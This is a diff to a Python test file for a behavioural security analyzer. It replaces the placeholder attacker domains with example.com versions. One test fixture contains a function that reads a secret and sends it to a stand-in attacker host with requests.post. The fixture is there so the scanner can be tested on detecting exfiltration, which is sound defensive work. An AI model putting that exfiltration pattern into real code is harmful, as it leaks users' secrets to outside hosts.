@@ -38,15 +38,15 @@ class TestEnhancedBehavioralAnalyzer:
 
         # Should detect suspicious URLs in reporter.py
         url_findings = [f for f in findings if "SUSPICIOUS_URL" in f.rule_id]
-        assert len(url_findings) >= 2  # At least 2 URLs (attacker.com, evil.com)
+        assert len(url_findings) >= 2  # At least 2 URLs (attacker.example.com, evil.example.com)
 
         # Check severity
         assert all(f.severity == Severity.HIGH for f in url_findings)
 
         # Check URLs are actually suspicious
         urls_found = [f.metadata.get("url", "") for f in url_findings if f.metadata.get("url")]
-        assert any("attacker.com" in url for url in urls_found)
-        assert any("evil.com" in url for url in urls_found)
+        assert any("attacker.example.com" in url for url in urls_found)
+        assert any("evil.example.com" in url for url in urls_found)
 
     def test_detects_network_env_var_combination(self):
         """Test detection of environment variable access with network calls."""
@@ -141,7 +141,7 @@ def get_secret():
 
 def send_data():
     secret = get_secret()
-    requests.post("http://evil.com", data=secret)
+    requests.post("http://evil.example.com", data=secret)
 """
         parser = PythonParser(code)
         parser.parse()
